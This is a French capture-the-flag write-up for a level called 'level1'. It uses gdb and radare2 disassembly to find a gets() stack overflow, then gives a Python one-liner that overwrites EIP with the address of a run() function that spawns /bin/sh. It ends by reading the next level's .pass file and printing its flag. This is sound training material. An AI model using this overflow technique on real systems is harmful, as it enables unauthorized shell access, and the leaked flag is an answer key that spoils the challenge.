Dans ce niveau on a un executable ```level1```

On va gdb et regarder le main  ```gdb level1```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
```
Ensuite on va afficher toutes les fonctions presentes dans l'executable 

```sh
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

En exportant l'executable en local on peut l'analyser avec ```radar2```

On va enchainer les commandes ```aaaaa``` (pour le max d'infos) et ```afl``` (pour les fonctions)

On va chercher a regarder la fonction ```run``` avec ```pdf @ sub.run_8048444```

```sh
[0x08048390]> pdf @ sub.run_8048444 
            ;-- run:
╭ 60: sub.run_8048444 ();
│ afv: vars(3:sp[0x10..0x18])
│           0x08048444      55             push ebp
│           0x08048445      89e5           mov ebp, esp
│           0x08048447      83ec18         sub esp, 0x18
│           0x0804844a      a1c0970408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
│                                                                      ; [0x80497c0:4]=0
│           0x0804844f      89c2           mov edx, eax
│           0x08048451      b870850408     mov eax, str.Good..._Wait_what__n ; 0x8048570 ; "Good... Wait what?\n"
│           0x08048456      8954240c       mov dword [var_ch], edx
│           0x0804845a      c744240813..   mov dword [var_8h], 0x13    ; [0x13:4]=-1 ; 19
│           0x08048462      c744240401..   mov dword [var_4h], 1
│           0x0804846a      890424         mov dword [esp], eax
│           0x0804846d      e8defeffff     call sym.imp.fwrite
│           0x08048472      c704248485..   mov dword [esp], str._bin_sh ; [0x8048584:4]=0x6e69622f ; "/bin/sh"
│           0x08048479      e8e2feffff     call sym.imp.system
│           0x0804847e      c9             leave
╰           0x0804847f      c3             ret
``` 

On voit des chaines ecritent en 'dur' et un appel system avec ```/bin/sh``` c'est ce qu'on va cibler

Le but est donc de faire overflow le buffer de la fonction ```gets()``` du main pour ecraser le registre $EIP

On va faire un scrypt python pour ca ```(python -c 'print"A" * 76 + "\x44\x84\x04\x08"' && cat) | ./level1```

- 'print"A" * 76'
    - Remplir le buffeur de 76 octet pour creer l'overflow car le registre ```EIP``` est place juste apres
    - Il y a 80 octets d'alloue pour les variables locales ```0x08048486 <+6>:	sub    $0x50,%esp```
    - Donc 76 car le registre ```EIP``` prend ```4 octets``` supplementaire en systeme ```little-endian```
- '+ "\x44\x84\x04\x08"'
    - C'est pour remplir le registre ```EIP``` avec l'adresse de la fonction run ```0x08048444  run```
    - La notation en ```little-endian``` comme ici stock l'adresse ```44 84 04 08```
    - la notation en ```big-endian``` l'aurait note ```08 04 84 44``` en memoire
- '&& cat'
    - On veut garder ```stdin``` ouvert pour attendre une entree avant que le programme se coupe et que l'overflow se produise
- ' | ./level1'
    - On passe ce script au programme ```level1``` pour declencher l'overflow

Une fois le script lancee la fonction ```run()``` se lance pendant l'overflow

On recupere le flag avec ```cat /home/user/level2/.pass``` = ```53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77```